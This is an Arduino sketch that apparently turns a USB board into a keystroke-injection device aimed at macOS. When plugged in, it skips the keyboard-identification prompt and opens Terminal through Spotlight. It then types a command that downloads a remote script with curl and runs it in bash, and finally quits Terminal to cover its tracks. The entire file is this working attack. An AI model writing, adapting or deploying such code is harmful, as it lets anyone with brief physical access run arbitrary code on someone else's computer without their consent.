#include "Arduino.h"
#include <Keyboard.h>

#ifndef LED_BUILTIN
#define LED_BUILTIN 13
#endif

void blink()
{
  for (int i=10; i--; i>0)
  {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(i * 100);
    digitalWrite(LED_BUILTIN, LOW);
    delay(100);
  }
}

void run()
{
  Keyboard.begin();

  // Ignore keyboard identification
  Keyboard.press(KEY_LEFT_GUI);
  delay(50);
  Keyboard.write('w');
  delay(50);
  Keyboard.release(KEY_LEFT_GUI);
  delay(50);

  // Command + Space
  Keyboard.press(KEY_LEFT_GUI);
  delay(50);
  Keyboard.write(' ');
  delay(50);
  Keyboard.release(KEY_LEFT_GUI);
  delay(50);

  // Open terminal
  Keyboard.print("terminal\n");
  delay(50);

  // Clear any previous command line entry
  Keyboard.press(128);
  delay(50);
  Keyboard.write('c');
  delay(50);
  Keyboard.release(128);
  delay(50);

  // Fun
  Keyboard.print("bash <(curl -s https://example.com/script)\n");
  delay(3000);

  // quit
  Keyboard.press(KEY_LEFT_GUI);
  delay(50);
  Keyboard.write('q');
  delay(50);
  Keyboard.release(KEY_LEFT_GUI);
  delay(50);
}

void setup()
{
  pinMode(LED_BUILTIN, OUTPUT);
  blink();
  run();
}

void loop() { }
